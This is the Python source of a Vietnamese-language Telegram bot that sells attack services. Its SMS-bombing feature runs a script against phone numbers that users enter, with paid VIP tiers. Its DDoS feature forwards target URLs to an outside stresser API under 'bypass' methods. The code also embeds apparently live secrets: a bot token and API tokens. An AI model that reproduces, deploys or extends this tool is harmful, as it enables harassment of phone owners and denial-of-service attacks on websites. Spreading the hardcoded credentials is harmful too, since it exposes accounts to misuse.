import datetime
import hashlib
import time
import os
import subprocess
import psutil
import base64
import requests
import sqlite3
from telegram import ParseMode, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler, CallbackContext
from telegram.update import Update
import re
from threading import Timer

# Constants
PHONE_NUMBER, KEY_INPUT, PHONE_NUMBER_SUPER, THREADS_SUPER, HTTPS_STRONG, HTTPS_BYPASS, HTTPS_RATES = range(7)
PHONE_NUMBER_REGEX = r'^0[2-9]\d{8,9}$'

# Globals
processes = []
allowed_users = []
allowed_usersvip = []
ADMIN_ID = 5668356457

# Database connections
vip_connection = sqlite3.connect('vip_data.db', check_same_thread=False)
vip_cursor = vip_connection.cursor()

vip_cursor.execute('''
    CREATE TABLE IF NOT EXISTS vip_users (
        user_id INTEGER PRIMARY KEY
    )
''')
vip_connection.commit()

connection = sqlite3.connect('khach_data.db', check_same_thread=False)
cursor = connection.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()

def load_vip_users_from_database():
    vip_cursor.execute('SELECT user_id FROM vip_users')
    rows = vip_cursor.fetchall()
    for row in rows:
        vip_id = row[0]
        allowed_usersvip.append(vip_id)

def save_vip_user_to_database(vip_id):
    vip_cursor.execute('INSERT INTO vip_users (user_id) VALUES (?)', (vip_id,))
    vip_connection.commit()

def add_vip(update: Update, context: CallbackContext):
    admin_id = update.message.from_user.id
    if admin_id != ADMIN_ID:
        update.message.reply_text('Bạn không có quyền sử dụng lệnh này.')
        return

    if len(context.args) == 0:
        update.message.reply_text('Vui lòng nhập ID người dùng VIP.')
        return

    vip_id = int(context.args[0])
    allowed_usersvip.append(vip_id)
    save_vip_user_to_database(vip_id)
    update.message.reply_text(f'Người dùng có ID {vip_id} đã được thêm vào danh sách VIP.')

load_vip_users_from_database()

def remove_user(update: Update, context: CallbackContext):
    admin_id = update.message.from_user.id
    if admin_id != ADMIN_ID:
        update.message.reply_text('Bạn không có quyền sử dụng lệnh này.')
        return

    if len(context.args) == 0:
        update.message.reply_text('Vui lòng nhập ID người dùng.')
        return

    vip_id = int(context.args[0])
    if vip_id in allowed_usersvip:
        allowed_usersvip.remove(vip_id)
        vip_cursor.execute('DELETE FROM vip_users WHERE user_id = ?', (vip_id,))
        vip_connection.commit()
        update.message.reply_text(f'Người dùng có ID {vip_id} đã được xóa khỏi danh sách VIP.')
    else:
        update.message.reply_text(f'Người dùng có ID {vip_id} không tồn tại trong danh sách VIP.')

def user_list(update: Update, context: CallbackContext):
    admin_id = update.effective_user.id
    if admin_id != ADMIN_ID:
        update.message.reply_text('Bạn không có quyền sử dụng lệnh này.')
        return

    if len(allowed_usersvip) == 0:
        update.message.reply_text('Danh sách người dùng VIP hiện đang trống.')
        return

    user_list_text = 'Danh sách người dùng VIP:\n'
    for vip_id in allowed_usersvip:
        user = context.bot.get_chat_member(update.message.chat.id, vip_id)
        user_list_text += f'- ID: {user.user.id}, Tên: {user.user.first_name} {user.user.last_name}, Username: @{user.user.username}\n'
    update.message.reply_text(user_list_text)

def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(user_id, expiration_time):
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()

def add_user(update: Update, context: CallbackContext):
    admin_id = update.message.from_user.id
    if admin_id != ADMIN_ID:
        update.message.reply_text('Bạn không có quyền sử dụng lệnh này.')
        return

    if len(context.args) == 0:
        update.message.reply_text('Vui lòng nhập ID người dùng.')
        return

    user_id = int(context.args[0])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    save_user_to_database(user_id, expiration_time)
    update.message.reply_text(f'Người dùng có ID {user_id} đã được thêm vào danh sách được phép sử dụng lệnh /supersms.')

load_users_from_database()

def start(update: Update, context: CallbackContext):
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text='🚀 Attack'), KeyboardButton(text='ℹ️ HELP')],
            [KeyboardButton(text='ℹ️ Info'), KeyboardButton(text='🔑 Key'), KeyboardButton(text='🗝 GETxKEY')],
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    welcome_message = (
        '👋 Chào mừng bạn đến với bot!\n'
        'Bot được tạo bởi @nekozic.\n'
        'Vui lòng chọn một chức năng từ menu bên dưới.'
    )
    update.message.reply_text(welcome_message, reply_markup=keyboard)

def help(update: Update, context: CallbackContext):
    huongdan = '<a href="https://t.me/crowservices/73331">Bấm Vào Đây Để Xem Hướng Dẫn Chi Tiết</a>'
    help_message = (
        '📋 Hướng dẫn sử dụng bot:\n'
        '- Chọn chức năng từ menu chính.\n'
        '- Nhập thông tin theo yêu cầu.\n'
        'Nếu cần thêm trợ giúp, vui lòng liên hệ @nekozic.\n\n'
        f'{huongdan}'
    )
    update.message.reply_text(help_message, parse_mode='HTML')

def attack(update: Update, context: CallbackContext):
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text='📲 SMS'), KeyboardButton(text='🌐 DDOS')],
            [KeyboardButton(text='🔙 MENU')],
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    attack_message = '💥 Vui lòng chọn chức năng tấn công từ menu bên dưới:'
    update.message.reply_text(attack_message, reply_markup=keyboard)

def sms(update: Update, context: CallbackContext):
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text='💬 BASIC'), KeyboardButton(text='🚀 SUPER'), KeyboardButton(text='🛑 STOP SMS')],
            [KeyboardButton(text='🔙 MENU')],
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    sms_message = '📲 Vui lòng chọn chế độ tấn công SMS từ menu bên dưới:'
    update.message.reply_text(sms_message, reply_markup=keyboard)

def ddos(update: Update, context: CallbackContext):
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text='🛠 L7'), KeyboardButton(text='🛠 L4'), KeyboardButton(text='📈 CHECK-HOST')],
            [KeyboardButton(text='🔙 MENU')],
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    ddos_message = '🌐 Vui lòng chọn chức năng tấn công DDoS từ menu bên dưới:'
    update.message.reply_text(ddos_message, reply_markup=keyboard)

def l7_options(update: Update, context: CallbackContext):
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text='HTTPS-STRONG'), KeyboardButton(text='HTTPS-BYPASS')],
            [KeyboardButton(text='HTTPS-RATES')],
            [KeyboardButton(text='🔙 MENU')],
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    update.message.reply_text('Vui Lòng Chọn Methods', reply_markup=keyboard)

def l4_options(update: Update, context: CallbackContext):
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text='UDP-BYPASS'), KeyboardButton(text='TCP-BYPASS')],
            [KeyboardButton(text='🔙 MENU')],
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    update.message.reply_text('Bảo Trì', reply_markup=keyboard)

def handle_https(update: Update, context: CallbackContext, method: str, state: int):
    user_id = update.message.from_user.id
    if user_id not in allowed_users:
        update.message.reply_text('Bạn phải xác thực key trước khi sử dụng chức năng này.')
        return

    current_time = time.time()
    last_used_time = context.user_data.get('last_used_time', 0)
    if current_time - last_used_time < 60:
        remaining_time = int(60 - (current_time - last_used_time))
        update.message.reply_text(f'Bạn cần đợi {remaining_time} giây trước khi sử dụng lại lệnh.')
        return

    context.user_data['last_used_time'] = current_time
    update.message.reply_text('Vui lòng nhập URL website:')
    return state

def handle_https_input(update: Update, context: CallbackContext, method: str):
    url = update.message.text
    make_api_request(update, context, url, method)
    return ConversationHandler.END

def handle_https_strong(update: Update, context: CallbackContext):
    return handle_https(update, context, 'HTTPS-STRONG', HTTPS_STRONG)

def handle_https_strong_input(update: Update, context: CallbackContext):
    return handle_https_input(update, context, 'HTTPS-STRONG')

def handle_https_bypass(update: Update, context: CallbackContext):
    return handle_https(update, context, 'HTTPS-BYPASS', HTTPS_BYPASS)

def handle_https_bypass_input(update: Update, context: CallbackContext):
    return handle_https_input(update, context, 'HTTPS-BYPASS')

def handle_https_rates(update: Update, context: CallbackContext):
    return handle_https(update, context, 'HTTPS-RATES', HTTPS_RATES)

def handle_https_rates_input(update: Update, context: CallbackContext):
    return handle_https_input(update, context, 'HTTPS-RATES')

def delete_waiting_message(bot, chat_id, message_id):
    bot.delete_message(chat_id, message_id)

def make_api_request(update: Update, context: CallbackContext, url: str, method: str):
    waiting_message = update.message.reply_text('Đang gửi yêu cầu tới api đợi vài giây =)))))')
    api_url = f'https://api.nm2302.site/0.php?url={url}&time=30&method=https-free'
    response = requests.get(api_url)
    check_link = f'https://check-host.net/check-http?host={url}&csrf_token=782d5ee2936002ce3c7e07a7285dc1eef73eefc8'
    link_text = f'<a href="{check_link}">Bấm Vào Đây</a>'
    if response.status_code == 200:
        update.message.reply_text(f'🚀 Attack Sent Successfully 🚀\nBot 👾: 𝒩ℯ𝓀ℴ𝓏𝒾𝒸 - 𝒮ℳ𝒮\nMục Tiêu 🔗: [  {url} ]\nMethods ⚒️ : [  {method} ]\nTime ⏳ : [ 60 ]\nPort 🚪 : [ 443 ]\nPlan 💸:  [ Free ]\nCooldown ⏱️: [ 120s ]\nCheck Result 📱 :  [ {link_text} ]\nOwner & Dev 👑: Nguyễn Linh🌸', parse_mode='HTML')
        Timer(0, delete_waiting_message, args=(context.bot, update.message.chat_id, waiting_message.message_id)).start()
    else:
        update.message.reply_text('api đang bị j đó ahihihihihi')

def is_allowed_user(update: Update):
    user_id = update.message.from_user.id
    return user_id in allowed_users

def stop_sms(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in allowed_usersvip:
        update.message.reply_text('Bạn không có quyền sử dụng lệnh này. Chỉ Người Dùng Vip Hoặc Admin Mới Có Thể Dùng')
        return
    for process in processes:
        process.kill()
    update.message.reply_text('Đã dừng lại tất cả các tệp sms.py đang chạy.')

def basic_attack(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in allowed_users:
        update.message.reply_text('⚠️ Bạn phải xác thực key trước khi sử dụng chức năng này.')
        return

    current_time = time.time()
    last_used_time = context.user_data.get('last_used_time', 0)
    if current_time - last_used_time < 60:
        remaining_time = int(60 - (current_time - last_used_time))
        update.message.reply_text(f'⌛ Bạn cần đợi {remaining_time} giây trước khi sử dụng lại lệnh.')
        return

    context.user_data['last_used_time'] = current_time
    update.message.reply_text('📲 Vui lòng nhập số điện thoại:')
    return PHONE_NUMBER

def receive_phone_number(update: Update, context: CallbackContext):
    phone_number = update.message.text
    if not re.match(PHONE_NUMBER_REGEX, phone_number):
        update.message.reply_text('⚠️ Số điện thoại không hợp lệ. Vui lòng nhập số điện thoại Việt Nam hợp lệ.')
        return PHONE_NUMBER
    
    file_path = os.path.join(os.getcwd(), "sms.py")
    process = subprocess.Popen(["python", file_path, phone_number, "15"])
    processes.append(process)
    update.message.reply_text(
        f'🚀 Attack Sent Successfully 🚀 \n'
        f'Bot 👾: 𝒩ℯ𝓀ℴ𝓏𝒾𝒸 - 𝒮ℳ𝒮\n'
        f'Mục Tiêu 📱: [ {phone_number} ]\n'
        f'Luồng ⚔: [ 40 ]\n'
        f'Plan 💸: [ Free ]\n'
        f'Cooldown ⏱️: [ 120s ]\n'
        f'Owner & Dev 👑: Nguyễn Linh🌸'
    )
    return ConversationHandler.END

def super_attack(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in allowed_usersvip:
        update.message.reply_text('Đây Là Lệnh Của Người Dùng Vip . Hãy Mua Để Có Thể Dùng Nếu Mua Liên Hệ @nekozic')
        return
    update.message.reply_text('Vui lòng nhập số điện thoại:')
    return PHONE_NUMBER_SUPER

def receive_phone_number_super(update: Update, context: CallbackContext):
    phone_number = update.message.text
    if not re.match(PHONE_NUMBER_REGEX, phone_number):
        update.message.reply_text('Số điện thoại không hợp lệ. Vui lòng nhập số điện thoại Việt Nam hợp lệ.')
        return PHONE_NUMBER_SUPER

    context.user_data['phone_number_super'] = phone_number
    update.message.reply_text('Vui lòng nhập số luồng:')
    return THREADS_SUPER

def receive_threads(update: Update, context: CallbackContext):
    threads_input = update.message.text
    try:
        threads = int(threads_input)
        if threads < 0 or threads > 150:
            update.message.reply_text('Số luồng phải nằm trong khoảng từ 0 đến 150.')
            return THREADS_SUPER
    except ValueError:
        update.message.reply_text('Vui lòng nhập một số nguyên.')
        return THREADS_SUPER

    context.user_data['threads_super'] = threads
    phone_number = context.user_data.get('phone_number_super')

    if not phone_number:
        update.message.reply_text('Thiếu thông tin số điện thoại.')
        return ConversationHandler.END

    file_path = os.path.join(os.getcwd(), "sms.py")
    process = subprocess.Popen(["python", file_path, phone_number, str(threads)])
    processes.append(process)

    update.message.reply_text(
        f'🚀 Attack Sent Successfully 🚀 \n'
        f'Bot 👾: 𝒩ℯ𝓀ℴ𝓏𝒾𝒸 - 𝒮ℳ𝒮\n'
        f'Mục Tiêu 📱: [ {phone_number} ]\n'
        f'Luồng ⚔: [ {threads} ]\n'
        f'Plan 💸: [ Vip ]\n'
        f'Cooldown ⏱️: [ 300s ]\n'
        f'Owner & Dev 👑: Nguyễn Linh🌸'
    )
    return ConversationHandler.END

def back(update: Update, context: CallbackContext):
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text='🚀 Attack')],
            [KeyboardButton(text='ℹ️ Info'), KeyboardButton(text='🔑 Key'), KeyboardButton(text='🗝 GETxKEY')],
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    update.message.reply_text('🔙 Đã quay lại menu chính', reply_markup=keyboard)

def get_key(update: Update, context: CallbackContext):
    encoded_id = base64.b64encode(str(update.effective_user.id).encode()).decode()
    key = generate_key(encoded_id)
    
    long_url = f"https://i1crow1.github.io/getkey/key.html?key={key}"
    api_token = '3fd45743c398292f5a71642533441b3fe5b1ada9a5bd12e9f5e355271229871c'
    url = requests.get(f'https://yeumoney.com/QL_api.php?token={api_token}&format=json&url={long_url}').json()
    link = url['shortenedUrl']

    link_text = f"🔑 Link key của bạn : <a href='{link}'>Nhấn vào đây</a> "
    update.message.reply_text(link_text, parse_mode='HTML')

def process_key(update: Update, context: CallbackContext):
    text = update.message.text.split()

    if len(text) >= 2 and text[0].strip() == "/key":
        key = text[1].strip()

        if key == "":
            update.message.reply_text('Vui lòng nhập key.\nNếu bạn chưa nhận key, vui lòng nhấp /getkey để nhận key.')
        else:
            encoded_user_id = base64.b64encode(str(update.effective_user.id).encode()).decode()

            if key == generate_key(encoded_user_id):
                expiration_time = datetime.datetime.now() + datetime.timedelta(days=1)
                user_id = update.effective_user.id
                allowed_users.append(user_id)
                save_user_to_database(user_id, expiration_time)

                num_users = len(allowed_users)
                update.message.reply_text(f'Xác thực key thành công. Cảm ơn bạn đã ủng hộ. Hiện có {num_users} người đã xác thực key.')
            else:
                update.message.reply_text('Xác thực key thất bại. Nếu bạn chưa nhận key, vui lòng nhấp GETxKey để nhận key.')

def request_key(update: Update, context: CallbackContext):
    update.message.reply_text('Vui lòng nhập key.')
    return KEY_INPUT

def receive_key(update: Update, context: CallbackContext):
    key = update.message.text.strip()
    encoded_user_id = base64.b64encode(str(update.effective_user.id).encode()).decode()

    if key == generate_key(encoded_user_id):
        expiration_time = datetime.datetime.now() + datetime.timedelta(days=1)
        user_id = update.effective_user.id
        allowed_users.append(user_id)
        save_user_to_database(user_id, expiration_time)

        num_users = len(allowed_users)
        update.message.reply_text(f'Xác thực key thành công. Cảm ơn bạn đã ủng hộ. Hiện có {num_users} người đã xác thực key.')
    else:
        update.message.reply_text('Xác thực key thất bại. Nếu bạn chưa nhận key, vui lòng nhấp GETxKEY để nhận key.')

    return ConversationHandler.END

def cancel(update: Update, context: CallbackContext):
    update.message.reply_text('Quá trình nhập key đã bị hủy bỏ.')
    return ConversationHandler.END

def get_info(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    username = update.message.from_user.username
    link = f'https://t.me/{username}' if username else 'N/A'

    info_text = f'Đây Là ID Của Bạn: {user_id}\nLiên Kết Tới Trang Telegram Của Bạn: {link}\n\nĐây Là Bản Thử Nghiệm Của Bot Nên Còn 1 Số Lỗi\nNếu Gặp Lỗi Vui Lòng Liên Hệ @nekozic\n© Copyright By @nekozic'
    update.message.reply_text(info_text)

def generate_key(user_id):
    today = datetime.date.today().strftime("%Y-%m-%d")
    key_string = f"{user_id}-{today}"
    key = hashlib.sha256(key_string.encode()).hexdigest()
    return key

def main():
    updater = Updater(token='7464689937:AAECZ_45860ivY3ffPKzaxpgWAbTMC3GvF0', use_context=True)
    dispatcher = updater.dispatcher

    conv_handler_https_strong = ConversationHandler(
        entry_points=[MessageHandler(Filters.regex('^HTTPS-STRONG$'), handle_https_strong)],
        states={
            HTTPS_STRONG: [MessageHandler(Filters.text & ~Filters.command, handle_https_strong_input)],
        },
        fallbacks=[],
    )

    conv_handler_https_bypass = ConversationHandler(
        entry_points=[MessageHandler(Filters.regex('^HTTPS-BYPASS$'), handle_https_bypass)],
        states={
            HTTPS_BYPASS: [MessageHandler(Filters.text & ~Filters.command, handle_https_bypass_input)],
        },
        fallbacks=[],
    )

    conv_handler_https_rates = ConversationHandler(
        entry_points=[MessageHandler(Filters.regex('^HTTPS-RATES$'), handle_https_rates)],
        states={
            HTTPS_RATES: [MessageHandler(Filters.text & ~Filters.command, handle_https_rates_input)],
        },
        fallbacks=[],
    )

    conv_handler_basic = ConversationHandler(
        entry_points=[MessageHandler(Filters.regex('^💬 BASIC$'), basic_attack)],
        states={
            PHONE_NUMBER: [MessageHandler(Filters.text & ~Filters.command, receive_phone_number)],
        },
        fallbacks=[],
    )

    conv_handler_key = ConversationHandler(
        entry_points=[MessageHandler(Filters.regex('^🔑 Key$'), request_key)],
        states={
            KEY_INPUT: [MessageHandler(Filters.text & ~Filters.command, receive_key)],
        },
        fallbacks=[MessageHandler(Filters.command, cancel)],
    )

    conv_handler_super = ConversationHandler(
        entry_points=[MessageHandler(Filters.regex('^🚀 SUPER$'), super_attack)],
        states={
            PHONE_NUMBER_SUPER: [MessageHandler(Filters.text & ~Filters.command, receive_phone_number_super)],
            THREADS_SUPER: [MessageHandler(Filters.text & ~Filters.command, receive_threads)],
        },
        fallbacks=[],
    )

    dispatcher.add_handler(conv_handler_key)
    dispatcher.add_handler(conv_handler_https_strong)
    dispatcher.add_handler(conv_handler_https_bypass)
    dispatcher.add_handler(conv_handler_https_rates)
    dispatcher.add_handler(conv_handler_basic)
    dispatcher.add_handler(conv_handler_super)

    dispatcher.add_handler(CommandHandler('start', start))
    dispatcher.add_handler(CommandHandler('attack', attack))
    dispatcher.add_handler(CommandHandler('menu', back))
    dispatcher.add_handler(CommandHandler('getxkey', get_key))
    dispatcher.add_handler(CommandHandler('info', get_info))
    dispatcher.add_handler(CommandHandler('adduser', add_user))
    dispatcher.add_handler(CommandHandler('removeuser', remove_user))
    dispatcher.add_handler(CommandHandler('userlist', user_list))
    dispatcher.add_handler(CommandHandler('addvip', add_vip))
    dispatcher.add_handler(CommandHandler('stopsms', stop_sms))
    dispatcher.add_handler(MessageHandler(Filters.regex('^🚀 Attack$'), attack))
    dispatcher.add_handler(MessageHandler(Filters.regex('^📲 SMS$'), sms))
    dispatcher.add_handler(MessageHandler(Filters.regex('^🌐 DDOS$'), ddos))
    dispatcher.add_handler(MessageHandler(Filters.regex('^🔙 MENU$'), back))
    dispatcher.add_handler(MessageHandler(Filters.regex('^🛑 STOP SMS$'), stop_sms))
    dispatcher.add_handler(MessageHandler(Filters.regex('^🗝 GETxKEY$'), get_key))
    dispatcher.add_handler(MessageHandler(Filters.regex('^ℹ️ Info$'), get_info))
    dispatcher.add_handler(MessageHandler(Filters.regex('^🛠 L7$'), l7_options))
    dispatcher.add_handler(MessageHandler(Filters.regex('^🛠 L4$'), l4_options))
    dispatcher.add_handler(MessageHandler(Filters.regex('^ℹ️ HELP$'), help))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
